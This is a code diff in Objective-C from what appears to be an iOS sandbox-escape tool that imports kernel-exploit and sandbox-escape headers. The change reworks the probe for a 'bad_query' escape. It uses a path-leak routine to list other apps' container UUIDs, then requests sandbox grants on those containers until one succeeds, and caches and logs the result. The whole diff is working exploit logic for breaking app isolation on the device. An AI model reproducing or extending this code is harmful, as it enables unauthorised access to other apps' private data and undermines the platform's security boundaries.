@@ -11,6 +11,7 @@
 #import "Vendor/sandbox_escape.h"
 #import "Vendor/kexploit_opa334.h"
 #import "Vendor/kutils.h"
+#import "FFPathleak.h"
 
 #import <errno.h>
 
@@ -244,23 +245,31 @@ static BOOL FFSandboxProbeUncached(void) {
             return sandbox_access_is_active() == 1;
 
         case FFSandboxBackendBadQuery: {
-            // 3106 probes ContainerStore.appDataRoot. Granting only
-            // /var/mobile/Containers/Data returns -4 (daemon matched, minted no
-            // token), so walk a small ladder: the first path bad_query accepts
-            // proves the escape is live, and an accepted ancestor covers its
-            // whole subtree for the later scans.
-            NSArray<NSString *> *candidates = @[
-                @"/var/mobile/Containers/Data/Application",
-                @"/var/mobile/Containers/Data",
-                @"/var/mobile/Containers",
-                @"/var/mobile",
-                @"/var",
-            ];
-            for (NSString *candidate in candidates) {
-                int64_t handle = FFSandboxGrantPath(candidate, YES, NULL);
+            // bad_query reaches /var/mobile/Containers/Data/Application/<uuid>
+            // but NOT the Application directory itself (the daemon matches but
+            // refuses to mint a token → -4). So the probe grants a real
+            // container: the UUID list comes from the fsgetpath walk, which
+            // needs no token.
+            static NSString *cachedContainer;
+            if (cachedContainer.length > 0) {
+                int64_t handle = FFSandboxGrantPath(cachedContainer, NO, NULL);
                 if (handle >= 0) {
                     FFSandboxReleaseHandle(handle);
-                    FFLog(@"sandbox: bad_query aceitou %@", candidate);
+                    return YES;
+                }
+                cachedContainer = nil;
+            }
+
+            NSArray<NSString *> *names = FFPathleakListNames(@"/var/mobile/Containers/Data/Application", 2000000);
+            for (NSString *name in names) {
+                if ([[NSUUID alloc] initWithUUIDString:name] == nil) continue;
+                NSString *container = [@"/var/mobile/Containers/Data/Application"
+                    stringByAppendingPathComponent:name];
+                int64_t handle = FFSandboxGrantPath(container, NO, NULL);
+                if (handle >= 0) {
+                    FFSandboxReleaseHandle(handle);
+                    cachedContainer = container;
+                    FFLog(@"sandbox: bad_query aceitou container %@", name);
                     return YES;
                 }
             }
